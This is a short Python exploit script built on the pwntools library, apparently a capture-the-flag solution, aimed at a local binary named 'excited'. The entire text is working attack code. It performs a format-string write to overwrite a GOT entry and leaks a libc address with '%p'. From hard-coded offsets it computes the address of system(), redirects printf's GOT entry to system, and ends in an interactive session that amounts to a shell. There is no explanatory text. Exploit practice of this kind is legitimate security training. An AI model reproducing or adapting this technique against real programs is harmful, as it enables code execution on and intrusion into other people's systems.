from pwn import * 

#context.log_level ='DEBUG'
context.arch = 'amd64'
p=process('./excited')
#gdb.attach(p)
#pause()
printf_plt = 0x403318
system_off = 0x53110 

p.recvuntil("see:")

payload = fmtstr_payload(6,{0x403330:p32(0x4011b6),},write_size='byte',no_dollars=True)

p.sendline(payload)
p.recvuntil("see:")
p.sendline(b"%p")
p.recvuntil("0x")
leak = int(p.recvn(12),16)
print(hex(leak))
libc_base = leak - 0x1e7963
system = libc_base + system_off
print(hex(libc_base))
print(hex(system))
payload = fmtstr_payload(6,{printf_plt:p64(system)},write_size='byte',no_dollars=True)
p.recvuntil("see:")
p.sendline(payload)

p.interactive()